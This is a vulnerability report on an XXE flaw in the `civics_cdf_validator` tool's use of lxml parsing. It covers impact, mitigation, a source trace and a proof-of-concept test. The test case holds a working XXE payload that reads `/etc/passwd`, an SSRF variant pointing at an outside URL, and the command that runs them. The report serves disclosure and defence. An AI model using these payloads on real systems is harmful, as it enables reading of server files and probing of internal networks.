### Vulnerabilities Found

- **Vulnerability Name:** XML External Entity (XXE) Injection

- **Description:**
    1. An attacker crafts a malicious XML file containing an external entity declaration. This declaration can be designed to access local files on the server or interact with internal network resources.
    2. The attacker submits this malicious XML file to the `civics_cdf_validator` tool, specifically through the `validate` command, providing the malicious XML as the `election_files` argument and a valid XSD schema using the `--xsd` argument if needed by the validator.
    3. The `civics_cdf_validator` tool, in components such as `base.py` (within the `RulesRegistry` class and `check_rules` method) and potentially `validator.py` and `rules.py`, parses the provided XML file using the `lxml.etree.parse` function. Critically, this parsing is performed without explicitly disabling external entity resolution.
    4. Due to the default behavior of `lxml.etree.parse`, the parser attempts to resolve and process any external entities declared in the XML file.
    5. If the malicious XML file is processed, the `lxml` library attempts to resolve the external entity. This resolution can lead to:
        - **Information Disclosure:** By crafting an XXE payload that references local file paths (e.g., using `SYSTEM` entities and `file:///` URI), an attacker can read the content of local files from the server where `civics_cdf_validator` is executed. This can expose sensitive information like configuration files, source code, or data.
        - **Server-Side Request Forgery (SSRF):** By defining an external entity that points to an external URL or internal network address (e.g., using `SYSTEM` entities and `http://` URI), the attacker can make the server initiate requests to other systems. This can be used to probe internal network resources, interact with internal services, or even perform actions on external systems on behalf of the server.

- **Impact:**
    - **Confidentiality:** High. Successful exploitation can lead to unauthorized access to sensitive local files on the server, resulting in the disclosure of confidential information.
    - **Security:** Medium. In the case of SSRF, an attacker can potentially probe internal network resources, interact with internal services, or cause other security impacts depending on the internal services and their vulnerabilities when accessed from the server running `civics_cdf_validator`.

- **Vulnerability Rank:** High

- **Currently implemented mitigations:**
    - None. The codebase uses `lxml.etree.parse` with default settings in `/code/base.py` and `/code/validator.py` when parsing both schema and election files. There are no explicit configurations to disable external entity resolution during XML parsing.

- **Missing mitigations:**
    - The project is missing explicit mitigations to prevent XML External Entity (XXE) vulnerabilities.
    - Mitigation should be implemented by configuring the `lxml` XML parser to disable external entity resolution. This is achieved by:
        - Creating an instance of `lxml.etree.XMLParser`.
        - Setting the `resolve_entities` parameter of the `XMLParser` to `False`.
        - Passing this configured `XMLParser` instance to the `etree.parse()` function when parsing XML files in `/code/base.py` and `/code/validator.py`.

- **Preconditions:**
    - An attacker must be able to provide a malicious XML file to a user who will then use the `civics_cdf_validator validate` command. This is readily achievable as the tool is designed to validate user-provided XML files.
    - The user must execute the `civics_cdf_validator validate` command and provide the path to the malicious XML file as the `election_files` argument and a valid XSD schema using the `--xsd` argument.
    - For SSRF exploitation, the server running `civics_cdf_validator` needs to have network connectivity to the target resources.

- **Source code analysis:**
    - The vulnerability lies in the use of `lxml.etree.parse` without disabling external entity resolution. This occurs in the `RulesRegistry.check_rules()` method in `/code/base.py`, which is called during the validation process initiated by the `validate` command in `validator.py`.

        ```python
        from lxml import etree
        ...
        class RulesRegistry(SchemaHandler):
            ...
            def check_rules(self):
                """Checks all rules."""
                try:
                    self.schema_tree = etree.parse(self.schema_file) # Vulnerable line
                    self.election_tree = etree.parse(self.election_file) # Vulnerable line
                except etree.LxmlError as e:
                    ...
        ```
    - **File: `/code/validator.py`**
        ```python
        from lxml import etree
        ...
        def main():
            ...
            elif options.cmd == "validate":
                ...
                validation_results = feed_validation(options)
                ...

        def feed_validation(options, ocd_id_list=None):
            ...
            registry = base.RulesRegistry(
                election_file=election_file,
                schema_file=options.xsd,
                ...
            )
            registry.check_rules()
            ...
        ```

    ```mermaid
    graph LR
        A[validator.py: main()] --> B[validator.py: feed_validation()]
        B --> C[base.py: RulesRegistry.check_rules()]
        C --> D{etree.parse(schema_file)}
        C --> E{etree.parse(election_file)}
        D & E --> F[lxml XML Parser (Vulnerable to XXE)]
    ```

    - **Explanation:**
        - The `validator.py` script handles the `validate` command and calls the `feed_validation` function.
        - `feed_validation` creates a `RulesRegistry` object from `base.py`.
        - Within `RulesRegistry.check_rules()`, `etree.parse()` is used to parse both the schema file (`self.schema_file`) and the election file (`self.election_file`).
        - The `etree.parse()` function, by default, is configured to resolve external entities.
        - The code does not instantiate `etree.XMLParser` with `resolve_entities=False` and pass it to `etree.parse()`.
        - Consequently, if a malicious XML file containing an external entity declaration is provided as input (either as schema or election file), the `lxml` parser will attempt to resolve it, leading to the XXE vulnerability.

- **Security test case:**
    1. **Create a malicious XML file:** Create a file named `xxe.xml` with the following content to test for local file inclusion, for example, reading `/etc/passwd` on Linux or `/etc/hostname` on any system:
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!-- or file:///etc/hostname -->
        ]>
        <ElectionReport>
          <VulnerabilityTest>
            <Output>&xxe;</Output>
          </VulnerabilityTest>
        </ElectionReport>
        ```
    2. **Create a dummy XSD file:** Create a file named `dummy_schema.xsd` with minimal valid XSD content to satisfy the validator's requirement for an XSD file. The content of this file is not critical for XXE testing itself.
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
          <xs:element name="ElectionReport">
            <xs:complexType>
              <xs:sequence>
                <xs:element name="VulnerabilityTest">
                  <xs:complexType>
                    <xs:sequence>
                      <xs:element name="Output" type="xs:string"/>
                    </xs:sequence>
                  </xs:complexType>
                </xs:element>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:schema>
        ```
    3. **Run the `civics_cdf_validator validate` command:** Execute the following command in the terminal, replacing `xxe.xml` and `dummy_schema.xsd` with the actual paths to your files:
        ```bash
        civics_cdf_validator validate xxe.xml --xsd dummy_schema.xsd -v
        ```
    4. **Examine the output:** Analyze the output of the command, especially the verbose output due to the `-v` flag.
        - **Successful XXE exploit:** If the vulnerability exists, the content of the targeted file (e.g., `/etc/passwd` or `/etc/hostname`) will be included in the output. This might appear within the standard output, in verbose log messages, or even within error messages if the system restricts file access but still attempts to process the entity. Look for user information from `/etc/passwd` or the hostname from `/etc/hostname` in the output.
        - **No exploit:** If the system is not vulnerable or if mitigations are in place (which is not the case here according to the vulnerability description), the output will not contain the file content, and there will be no indications of attempted external entity processing. You will likely see standard validation output, potentially with errors related to schema validation if the malicious XML is not schema-valid, but not file content disclosure.
    5. **SSRF Test (Optional):** To test for SSRF, modify the `xxe.xml` file to point to an external URL (e.g., `http://example.com`) instead of a local file:
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "http://example.com">
        ]>
        <ElectionReport>
          <VulnerabilityTest>
            <Output>&xxe;</Output>
          </VulnerabilityTest>
        </ElectionReport>
        ```
        Repeat steps 3 and 4. Use network monitoring tools (like `tcpdump` or `Wireshark`) on the machine running `civics_cdf_validator` to confirm if an HTTP request to `example.com` is initiated when the command is executed. If a request is observed, it confirms the SSRF vulnerability.
